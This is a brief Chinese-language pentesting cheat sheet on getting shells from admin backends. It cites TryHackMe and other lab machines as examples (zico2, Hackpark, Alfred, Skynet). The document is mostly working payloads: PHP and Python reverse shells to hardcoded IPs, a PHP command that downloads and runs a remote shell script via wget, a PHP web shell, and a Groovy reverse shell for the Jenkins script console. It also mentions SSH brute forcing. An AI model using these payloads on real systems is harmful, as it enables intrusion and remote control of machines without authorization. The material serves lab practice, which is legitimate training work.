# 后台getshell

## exp
### phpliteadmin 目录遍历+远程执行getshell  eg:zico2

#### 
```php
<?php $sock=fsockopen("192.168.37.131",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>  //kali txt文本
<?php system("wget kaliip/shell.txt -O /tmp/shell.php; php /tmp/shell.php");?>

```
```python

<?php echo system($_GET["cmd"]); ?> + 远程执行

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.253.166",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```


### BlogEngine.NET <= 3.3.6 Directory Traversal RCE eg: TryHackMe： Hackpark Room Writeup


### Jenkins”>“脚本控制台” getshell eg ：TryHackMe： Alfred Room Writeup

```sellcode
Thread.start {  
String host="10.0.0.1";  
int port=4242;  
String cmd="cmd.exe";  
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();  
}
```

### cms 远程文件包含  eg： TryHackMe – Skynet Walkthrough
## 代码执行
### php代码执行  TryHackMe: Internal Walkthrough
wordpass 模板可以执行php代码



# 爆破ssh
## TryHackMe： Hackpark Room
